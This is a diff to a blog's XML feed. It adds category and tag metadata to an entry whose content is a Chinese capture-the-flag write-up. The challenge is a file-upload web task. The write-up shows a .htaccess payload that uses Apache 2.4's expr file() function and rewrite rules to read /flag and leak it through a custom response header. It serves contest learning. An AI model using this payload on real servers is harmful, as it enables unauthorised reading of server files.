@@ -11,6 +11,18 @@
     <content type="html"><![CDATA[<p>说实话这题目本来也是想先利用.htaccess文件的重写机制在cookie里边导出flag的，但是不知道为啥一直不成</p><p>先来看看这些关键词有没有被过滤：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">RewriteEngine</span> <span class="hljs-literal">On</span><br><span class="hljs-attribute">RewriteRule</span> ^flag$ /flag<span class="hljs-meta"> [L]</span><br></code></pre></td></tr></table></figure><p>很好没被过滤，但是这个不完整，只能“写”不能“导出”</p><p>试了试HKcert2025的文件上传，想利用报错将flag导出，但是被过滤了</p><p>于是，既然php等外带方法不行，那就只能纯靠 Apache 配置实现文件读取和数据外带了</p><p>回到重写机制</p><p>这里采用<a href="https://httpd.apache.org/docs/2.4/expr.html%E7%9A%84%E7%9F%A5%E8%AF%86%EF%BC%8C%E5%88%A9%E7%94%A8%E4%BA%86">https://httpd.apache.org/docs/2.4/expr.html的知识，利用了</a> Apache 2.4 的 expr 表达式和正则匹配来读取文件内容</p><p><img src="/myblog/img/Unictf_2026/1.png" alt="1"></p><p>于是便有如下payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[RewriteEngine On<br>RewriteCond <span class="hljs-built_in">expr</span> <span class="hljs-string">&quot;file(&#x27;/flag&#x27;) =~ /(.+)/&quot;</span><br>RewriteRule .* - [E=FLAG_CONTENT:%1]<br>Header <span class="hljs-built_in">set</span> Falg <span class="hljs-string">&quot;%&#123;FLAG_CONTENT&#125;e&quot;</span>](https://httpd.apache.org/docs/2.4/expr.html)<br></code></pre></td></tr></table></figure><p>通过头文件的设置将flag重写至我们自己设定的Header里面</p><p><img src="/myblog/img/Unictf_2026/2.png" alt="1"></p><p>随后扫目录扫出&#x2F;upload目录下有一个test.txt文件，访问文件，查看响应包的Headers，得出flag</p><p><img src="/myblog/img/Unictf_2026/3.png" alt="1"></p>]]></content>
     
     
+    <categories>
+      
+      <category>web与我的旅</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>比赛wp/赛后总结</tag>
+      
+    </tags>
     
   </entry>
   
